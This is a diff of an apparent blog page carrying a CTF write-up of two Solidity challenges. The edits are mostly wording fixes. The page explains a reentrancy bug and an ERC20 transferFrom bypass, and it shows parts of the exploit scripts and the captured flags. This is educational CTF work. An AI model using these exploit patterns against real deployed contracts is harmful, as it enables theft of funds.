@@ -10,10 +10,10 @@
 <meta name="application-name" content="d4r3-w0lf&#39;s blog" />
 <meta property="og:site_name" content="d4r3-w0lf&#39;s blog" />
 
-<meta name="description" content="A Jeopordy style CTF hosted by QnQSec CTF team">
-<meta itemprop="description" content="A Jeopordy style CTF hosted by QnQSec CTF team" />
-<meta property="og:description" content="A Jeopordy style CTF hosted by QnQSec CTF team" />
-<meta name="twitter:description" content="A Jeopordy style CTF hosted by QnQSec CTF team" />
+<meta name="description" content="A Jeopardy-style CTF hosted by QnQSec CTF team">
+<meta itemprop="description" content="A Jeopardy-style CTF hosted by QnQSec CTF team" />
+<meta property="og:description" content="A Jeopardy-style CTF hosted by QnQSec CTF team" />
+<meta name="twitter:description" content="A Jeopardy-style CTF hosted by QnQSec CTF team" />
 
 <meta property="og:locale" content="en-gb" />
 <meta name="language" content="en-gb" />
@@ -25,13 +25,13 @@
 
 
 
-<meta name="generator" content="Hugo 0.151.1">
+<meta name="generator" content="Hugo 0.152.1">
 
     
     <meta property="og:url" content="http://localhost:1313/writeups/qnqsec_ctf_2025/">
   <meta property="og:site_name" content="d4r3-w0lf&#39;s blog">
   <meta property="og:title" content="QnQSec CTF">
-  <meta property="og:description" content="A Jeopordy style CTF hosted by QnQSec CTF team">
+  <meta property="og:description" content="A Jeopardy-style CTF hosted by QnQSec CTF team">
   <meta property="og:locale" content="en_gb">
   <meta property="og:type" content="article">
     <meta property="article:section" content="writeups">
@@ -43,7 +43,7 @@
     
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="QnQSec CTF">
-  <meta name="twitter:description" content="A Jeopordy style CTF hosted by QnQSec CTF team">
+  <meta name="twitter:description" content="A Jeopardy-style CTF hosted by QnQSec CTF team">
 
 
     
@@ -51,7 +51,7 @@
     <link rel="canonical" href="http://localhost:1313/writeups/qnqsec_ctf_2025/">
     <link href="/style.min.fd66b7ca726159bf63f94988bacb37589295244d875ae21d7775378fb7a161c2.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
-    <link href="/css/custom-code.min.2b641efa35113dfb41b2972f3b56c3220137dd54ab1334d5a43c5503442359e0.css" rel="stylesheet">
+    <link href="/css/custom-code.min.9a2d8d012ac1c779133d49f133f2102fe718e594b698ebeda36b3d3c5cce0d10.css" rel="stylesheet">
     <script src="/js/code-copy.min.39843ae1ecce47d1771daff983989865a0c7c3d0ab5332777c83bb984ce283a5.js" defer></script>
 
     
@@ -172,6 +172,32 @@
                 
             </header>
             
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-callmeback-">1. CallMeBack :</a>
+      <ul>
+        <li>
+          <ul>
+            <li></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#2-timelock-">2. Timelock :</a>
+      <ul>
+        <li>
+          <ul>
+            <li></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </details>
             <div class="page-content">
                 <h1 style="color: rgba(35, 141, 239, 1);">Web3</h1>
 <h2 id="1-callmeback-">1. CallMeBack :</h2>
@@ -229,16 +255,16 @@
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">solved</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><h5 id="solution-">Solution :</h5>
-<p>After looking at the given contracts code, the vulnerability is in the <code>CallMeBack</code> contract&rsquo;s <code>withdraw</code> function, which is prone to reentranncy attack. Here&rsquo;s why :</p>
+</span></span></code></pre></div><h5 id="my-approach-">My Approach :</h5>
+<p>After reviewing the given contract code, the vulnerability is located in the <code>CallMeBack</code> contract&rsquo;s <code>withdraw</code> function, which is susceptible to a reentrancy attack. Here&rsquo;s why :</p>
 <ol>
-<li>The contract doesn&rsquo;t follows CEI (checks-effects-interactions)</li>
+<li>The contract doesn&rsquo;t follow CEI (checks-effects-interactions)</li>
 <li>The balance is updated after the external call</li>
 <li>The contract uses a low-level <code>call</code> which forwards all gas</li>
 </ol>
 <p>Here is how I exploited it :</p>
-<p>First, I&rsquo;ve checked the ETH balance of CallMeBack contract , I confirmed that it has 1 ETH.</p>
-<p>The exploit script uses a malicious contract (Attack) that implements a receive() function to recursively withdraw funds from the CallMeBack contract. When the CallMeBack contract sends ETH to our contract, the receive() function is triggered, allowing us to withdraw more funds before the CallMeBack contract updates its balance.</p>
+<p>First, I&rsquo;ve checked the ETH balance of the CallMeBack contract, and I confirmed that it has 1 ETH.</p>
+<p>The exploit script uses a malicious contract (Attack) that implements a <code>receive()</code> function to recursively withdraw funds from the CallMeBack contract. When the CallMeBack contract sends ETH to our contract, the <code>receive()</code> function is triggered, allowing us to withdraw more funds before the CallMeBack contract updates its balance.</p>
 <h5 id="callmebackssol">CallMeBack.s.sol</h5>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
@@ -279,7 +305,7 @@
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="c1">// if contract still has funds,keep withdrawing (reentrancy)
+</span></span><span class="line"><span class="cl">        <span class="c1">// if contract still has funds, keep withdrawing (reentrancy)
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">cmb</span><span class="p">).</span><span class="nb">balance</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="n">cmb</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
@@ -294,8 +320,8 @@
 </span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">sent</span><span class="p">,</span> <span class="s">&#34;ETH sent to player failed&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>After running this script successfully , I accessed the flag from the remote server.</p>
-<p><strong>Flag is : <code>QnQSec{r33ntr4nt_c4llb4ck_1s_fun_4nd_3asy_t0_3xpl01t}</code></strong></p>
+</span></span></code></pre></div><p>After running this script successfully, I accessed the flag from the remote server.</p>
+<p><strong>Flag is :</strong> <code>QnQSec{r33ntr4nt_c4llb4ck_1s_fun_4nd_3asy_t0_3xpl01t}</code></p>
 <h2 id="2-timelock-">2. Timelock :</h2>
 <h5 id="challenge-description--1">Challenge Description :</h5>
 <p>Your grandpa gave you some coins, but you cannot spend them for 10 years. Can you hack and spend them today?</p>
@@ -355,12 +381,12 @@
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">solved</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><h5 id="solution--1">Solution :</h5>
-<p>After looking at the given contracts code, the main motto of the TimeLock contract is to lock the contracts for 10 years without using them. But there exits a subtle vulnerability in TimeLock contract, that is inheriting ERC20 contract directly but only applied the <code>lockTokens</code> modifier only on <code>transfer</code> function and forgot to override other token transfer functions. So, I&rsquo;ve got the idea that I can use <code>transferFrom()</code> function to the move the tokens.</p>
+</span></span></code></pre></div><h5 id="my-approach--1">My Approach :</h5>
+<p>After reviewing the given contract code, the primary objective of the TimeLock contract is to lock the contracts for 10 years without using them. But there exists a subtle vulnerability in the TimeLock contract, which is inheriting the ERC20 contract directly but only applies the <code>lockTokens</code> modifier only on the <code>transfer</code> function, and forgot to override other token transfer functions. So, I&rsquo;ve got the idea that I can use the <code>transferFrom()</code> function to move the tokens.</p>
 <p>Here is how I exploited it :</p>
 <ol>
-<li>First Attack script called <code>approve</code> function of ERC20 with player address as spender.</li>
-<li>I used <code>transferFrom</code> to spend the tokens of player</li>
+<li>The player approves spending by using the <code>approve</code> function of ERC20, specifying his address as the spender.</li>
+<li>The <code>transferFrom</code> function is then used to transfer the player&rsquo;s tokens.</li>
 </ol>
 <h5 id="timelockssol">Timelock.s.sol</h5>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
@@ -390,8 +416,8 @@
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>After running this script successfully , I accessed the flag from the remote server.</p>
-<p><strong>Flag is : <code>QnQSec{gr3at_j0b_y0u_l3arn7_4b0u7_3rc20_t0k3n5}</code></strong></p>
+</span></span></code></pre></div><p>After running this script successfully, I accessed the flag from the remote server.</p>
+<p><strong>Flag is :</strong> <code>QnQSec{gr3at_j0b_y0u_l3arn7_4b0u7_3rc20_t0k3n5}</code></p>
 
             </div>
         </article></main>
